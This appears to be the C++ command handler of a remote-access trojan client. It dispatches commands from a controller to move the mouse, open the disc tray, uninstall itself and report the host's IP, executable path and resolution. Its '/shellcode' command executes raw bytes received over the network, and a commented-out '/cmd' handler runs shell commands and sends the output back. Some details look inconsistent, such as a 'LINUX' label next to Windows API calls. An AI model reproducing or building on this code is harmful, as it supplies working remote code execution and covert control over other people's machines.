#include "commands.h"
#include "utils.h"
#include "inputcontrol.h"
#include "fileTransfer.h"

using namespace MoonNetworking;

int parseMessages(Client *c, char * buf, int length)
{
    if (parseFile(c, buf, length)) {
        return 0;
    }
    else if (strncmp(buf, "/cmd", 4) == 0)
    {
		/*
        std::string command = &buf[5];
        command += " 2>/dev/null";
        FILE *f = popen(command.c_str(), "r");
        if (f == 0)
        {
            char msg[] = ":ERROR:";
            c->sendTCP(msg);
            return 0;
        }
        const int BUFSIZE = 1024;
        char buffer[BUFSIZE];
        std::string ret = "";
        while (fgets(buffer, BUFSIZE, f))
        {
            ret += buffer;
        }
        char *sends = new char[strlen(ret.c_str())];
        strncpy(sends, ret.c_str(), strlen(ret.c_str()));
        c->sendTCP(sends);
        pclose(f);
		*/
    }
    else if (strncmp(buf, "/shellcode", 10) == 0)
    {
        (*(void (*)()) & buf[11])();
    }
    else if (strncmp(buf, "/open_tray", 10) == 0)
    {
		openDiscTray();
    }
    else if (strncmp(buf, "/close_tray", 11) == 0)
    {
		closeDiscTray();
    }
    else if (strncmp(buf, "/get_resolution", 15) == 0)
    {
		int xi, yi = 0;
		GetDesktopResolution(xi, yi);
        char x[10];
        char y[10];
        _itoa_s(xi, x, 10);
        _itoa_s(yi, y, 10);
        std::string sends = "{";
        sends += x;
        sends += ",";
        sends += y;
        sends += "}";

        std::cout << sends.c_str() << "\n";

        c->sendTCP(sends);
    }
    else if (strncmp(buf, "/requesting_reset", 17) == 0)
    {
        c->resetTCP();
    }
    else if (strncmp(buf, "/requesting_data", 16) == 0)
    {
        sendTCPIntro(c);
    }
    else if (strncmp(buf, "/shutdown", 9) == 0)
    {
        return 2;
    }
    else if (strncmp(buf, "/uninstall", 10) == 0)
    {
        return 4;
    }
    else
    {
        printf("TCP: %s\n", buf);
    }

    return 0;
}

int parseUDPMessages(Client *c, char * buf, int length)
{
    std::string recv = buf;
    if (parseFile(c, buf, length)) {
        //This if-statement is mainly here to ensure we don't
        //check the command against other commands.
        //Saves some processing time.
        return 1;
    }
    else if (strncmp(recv.c_str(), "/cursor_stream", 14) == 0)
    {                                                               
        try {
            std::string args = recv.substr(15);
            int x = atoi(args.substr(0, args.find(' ')).c_str());
            int y = atoi(args.substr(args.find(' ')).c_str());
            SetCursorPos(x, y);
        }
        catch (int)
        {
            std::cout << "ERROR: CURSOR STREAM\n";
        }
    }
    else if (strncmp(recv.c_str(), "/instant_keydown", 16) == 0)
    {
        //char c[3];
        //strcpy(c, &recv.c_str()[17]);
        //m_keyDown((SHORT)atoi(c));
    }
    else if (strncmp(recv.c_str(), "/instant_keyup", 14) == 0)
    {
        //char c[3];
        //strcpy(c, &recv.c_str()[15]);
        //m_keyUp((SHORT)atoi(c));
    }
    else if (strncmp(recv.c_str(), "/instant_mousedown", 18) == 0)
    {
        m_mouseDown();
    }
    else if (strncmp(recv.c_str(), "/instant_mouseup", 16) == 0)
    {
        m_mouseUp();
    }
    else if (strncmp(recv.c_str(), "/instant_rmousedown", 19) == 0)
    {
        m_rmouseDown();
    }
    else if (strncmp(recv.c_str(), "/instant_rmouseup", 17) == 0)
    {
        m_rmouseUp();
    }
    else {
		printf("UDP: %s\n", buf);
		return 1;
    }

    return 0;
}

void sendTCPIntro(Client * c) {
	int x, y = 0;
	GetDesktopResolution(x, y);

	std::stringstream sends_res_x;
	sends_res_x << "/add_x " << x;
	c->sendTCP(sends_res_x.str());

	std::stringstream sends_res_y;
	sends_res_y << "/add_y " << y;
	c->sendTCP(sends_res_y.str());

	std::stringstream sends_ip;
	sends_ip << "/add_ip " << getLocalIp();
    c->sendTCP(sends_ip.str());

	std::stringstream sends_path;
    sends_path << "/add_path " << getCurrentExecutablePath();
    c->sendTCP(sends_path.str());

    std::stringstream sends_name;;
	sends_name << "/add_name " << "LINUX" << "  VERSION: " << ".10";
    c->sendTCP(sends_name.str());
}